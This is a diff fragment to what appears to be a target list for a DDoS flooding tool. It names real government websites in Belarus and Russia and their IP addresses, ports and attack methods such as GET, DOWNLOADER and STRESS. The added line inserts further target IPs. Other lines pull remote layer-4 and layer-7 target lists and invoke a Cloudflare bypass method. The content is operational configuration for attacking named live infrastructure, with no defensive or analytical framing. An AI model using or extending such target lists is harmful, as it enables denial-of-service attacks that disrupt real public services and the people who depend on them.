@@ -68,6 +68,8 @@ http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://19
 
 http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET DOWNLOADER
 
+https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
+
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer4.lst
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS CFB
